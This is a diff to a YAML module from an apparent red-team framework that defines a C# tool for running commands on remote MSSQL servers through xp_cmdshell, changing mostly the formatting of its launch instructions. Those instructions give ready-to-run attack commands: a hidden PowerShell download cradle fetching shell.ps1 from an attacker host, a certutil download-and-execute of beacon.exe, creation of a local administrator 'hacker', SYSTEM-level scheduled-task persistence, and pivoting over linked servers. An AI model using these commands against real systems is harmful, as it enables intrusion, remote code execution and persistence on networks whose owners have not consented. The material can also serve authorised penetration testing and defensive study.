@@ -1,20 +1,20 @@
 meta:
-  name: "MSSQL Command Execution (C#)"
+  name: "MSSQL Command Execution (C#)*"
   category: "Lateral Movement"
   description: |
     Execute commands on remote MSSQL servers via xp_cmdshell.
-    
+
     Features:
     - Integrated Windows authentication
     - Automatic xp_cmdshell enablement
     - Remote command execution
     - Automatic cleanup (disables xp_cmdshell after use)
     - Sysadmin privilege check
-    
+
     This tool connects to MSSQL servers using current Windows credentials,
     enables xp_cmdshell if disabled, executes arbitrary commands, and
     cleans up by disabling xp_cmdshell afterwards.
-    
+
     WARNING: For authorized security testing only!
 
   effectiveness: "medium"
@@ -58,43 +58,64 @@ output:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -r:System.Data.dll {{ source_file }}"
   launch_instructions: |
-    C# MSSQL Command Execution - Launch Instructions
+    # Enumerate MSSQL Servers
 
-    Enumerate MSSQL Servers:
+    ```bash
     nmap -p 1433 --open 192.168.1.0/24
+    ```
+
+    ```powershell
     Get-SQLInstanceDomain
     Import-Module PowerUpSQL; Get-SQLInstanceBroadcast
+    ```
 
-    Execute Commands:
-    {{ output_file }} {{ mssql_server }} "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{{ lhost }}/shell.ps1')"
+    # Execute Commands
 
-    Example - Add Local Admin:
+    ```cmd
+    {{ output_file }} {{ mssql_server }} "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
+    ```
+
+    # Example - Add Local Admin
+
+    ```cmd
     {{ output_file }} {{ mssql_server }} "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
+    ```
 
-    Example - Download and Execute:
-    {{ output_file }} {{ mssql_server }} "certutil -urlcache -f http://{{ lhost }}/beacon.exe C:\\Temp\\beacon.exe && C:\\Temp\\beacon.exe"
+    # Example - Download and Execute
 
-    Example - Persistence:
+    ```cmd
+    {{ output_file }} {{ mssql_server }} "certutil -urlcache -f http://YOUR_IP/beacon.exe C:\\Temp\\beacon.exe && C:\\Temp\\beacon.exe"
+    ```
+
+    # Example - Persistence
+
+    ```cmd
     {{ output_file }} {{ mssql_server }} "schtasks /create /tn Update /tr C:\\Temp\\beacon.exe /sc onlogon /ru SYSTEM"
+    ```
 
-    Notes:
-    - Target: {{ mssql_server }} (port 1433)
+    # Notes
+
+    - Target: `{{ mssql_server }}` (port 1433)
     - Uses Integrated Windows Authentication (current user context)
-    - Commands execute as SQL Server service account (often NT SERVICE\MSSQLSERVER or domain account)
+    - Commands execute as SQL Server service account (often `NT SERVICE\MSSQLSERVER` or domain account)
     - Automatically enables xp_cmdshell if disabled (requires sysadmin role)
     - Cleans up by disabling xp_cmdshell after execution
     - Tool displays sysadmin status before executing
-    - Common service accounts: NT SERVICE\MSSQLSERVER, domain\sql_svc (often over-privileged)
-    - Alternative to xp_cmdshell: sp_OACreate (if xp_cmdshell blocked)
+    - Common service accounts: `NT SERVICE\MSSQLSERVER`, `domain\sql_svc` (often over-privileged)
+    - Alternative to xp_cmdshell: `sp_OACreate` (if xp_cmdshell blocked)
     - Linked servers: Use `EXEC ('xp_cmdshell ''cmd''') AT [LINKED_SERVER]` for pivoting
 
-    Troubleshooting:
-    - Access Denied: Check SQL permissions (need sysadmin or db_owner + CONTROL SERVER)
-    - Connection fails: Verify port 1433 open; SQL Server allows remote connections; firewall rules
-    - xp_cmdshell disabled and can't enable: Not sysadmin or explicitly denied via policy
-    - No output: Command may have failed or no stdout (redirect to file: >C:\temp\out.txt)
-    - Integrated auth fails: Try SQL authentication with -U user -P password flags
+    # Troubleshooting
+
+    - **Access Denied:** Check SQL permissions (need sysadmin or db_owner + CONTROL SERVER)
+    - **Connection fails:** Verify port 1433 open; SQL Server allows remote connections; firewall rules
+    - **xp_cmdshell disabled and can't enable:** Not sysadmin or explicitly denied via policy
+    - **No output:** Command may have failed or no stdout (redirect to file: `>C:\temp\out.txt`)
+    - **Integrated auth fails:** Try SQL authentication with -U user -P password flags
     - Consider linked server enumeration: `SELECT * FROM sys.servers WHERE is_linked = 1`
 
-    Cleanup:
-    $ Remove-Item {{ output_file }} -Force
+    # Cleanup
+
+    ```powershell
+    Remove-Item {{ output_file }} -Force
+    ```
